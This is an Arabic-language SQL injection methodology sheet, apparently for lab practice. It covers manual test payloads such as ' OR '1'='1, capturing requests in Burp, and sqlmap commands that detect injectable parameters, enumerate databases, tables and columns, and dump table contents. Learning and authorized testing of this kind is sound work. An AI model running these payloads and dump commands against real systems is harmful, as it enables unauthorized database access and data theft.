1. Identify Suspected Input

ابدأ بالـparameter أو الحقل الذي يتغير مع إدخال المستخدم قبل تشغيل أي Automation.

GET parameter BROWSER / BURP
https://[TARGET]/page.php?id=[INPUT]
غيّر قيمة parameter واحدًا في كل مرة وراقب هل يتغير الرد.
POST / Form field BURP SUITE
POST /login-or-form [PARAMETER]=[INPUT]
التقط الطلب الحقيقي كي تعرف أسماء الحقول والطريقة المستخدمة.

2. Manual Confirmation

اختبارات بسيطة لتحديد هل الإدخال قد يصل إلى استعلام SQL. لا تعتبر أي Payload دليلًا وحده.

اختبار Quotes BROWSER / BURP
' "
GENERAL REFERENCE — ابحث عن SQL error، اختلاف واضح في الصفحة، تغير status/length، أو behavior غير طبيعي. ظهور Error وحده مؤشر يحتاج تأكيد وليس إثباتًا نهائيًا.
Boolean behavior BROWSER / BURP
' OR '1'='1
GENERAL REFERENCE — قارن رد True condition برد False condition. اختلاف ثابت وقابل للتكرار أقوى من مجرد ظهور صفحة مختلفة مرة واحدة.
GENERAL REFERENCE — فشل Payload يدوي واحد لا ينفي SQL Injection؛ السياق ونوع قاعدة البيانات وطريقة بناء الاستعلام تؤثر على الاختبار.

3. Capture Request

إذا كان الطلب POST أو يحتاج Cookies/Headers، احفظه من Burp واستخدمه كما هو.

حفظ الطلب BURP SUITE
Proxy / Repeater → Save request as [REQUEST_FILE]
تمرير الطلب إلى sqlmap KALI TERMINAL
sqlmap -r [REQUEST_FILE] -p [PARAMETER]

4. SQLMap Detection

بعد وجود input مشتبه، شغّل Detection على URL أو request محفوظ.

GET / URL KALI TERMINAL
sqlmap -u "[URL]" -p [PARAMETER]
GENERAL REFERENCE — النجاح = sqlmap يحدد Parameter قابلًا للحقن ويعرض نوع التقنية/DBMS عندما يستطيع تحديدها.
Request محفوظ KALI TERMINAL
sqlmap -r [REQUEST_FILE] -p [PARAMETER]
GENERAL REFERENCE — النجاح = sqlmap يحدد Parameter قابلًا للحقن ويعرض نوع التقنية/DBMS عندما يستطيع تحديدها.

5. Enumeration

وسّع فقط بعد أن يؤكد sqlmap أن parameter قابل للحقن.

قواعد البيانات KALI TERMINAL
sqlmap -u "[URL]" -p [PARAMETER] --dbs
GENERAL REFERENCE — النجاح = ظهور أسماء Databases المتاحة للحساب الحالي.
الجداول KALI TERMINAL
sqlmap -u "[URL]" -p [PARAMETER] -D [DATABASE] --tables
GENERAL REFERENCE — النجاح = ظهور Tables للـDatabase المحددة.
الأعمدة KALI TERMINAL
sqlmap -u "[URL]" -p [PARAMETER] -D [DATABASE] -T [TABLE] --columns
GENERAL REFERENCE — النجاح = ظهور Columns للـTable المحدد.

6. Extraction

استخرج فقط البيانات المطلوبة في اللاب بعد تحديد قاعدة البيانات والجدول.

Dump جدول محدد KALI TERMINAL
sqlmap -u "[URL]" -p [PARAMETER] -D [DATABASE] -T [TABLE] --dump
لا تضف bypass/evasion تلقائيًا؛ ابدأ بأبسط مسار يثبت النتيجة.
GENERAL REFERENCE — النجاح = استخراج Rows يملك الحساب صلاحية قراءتها.
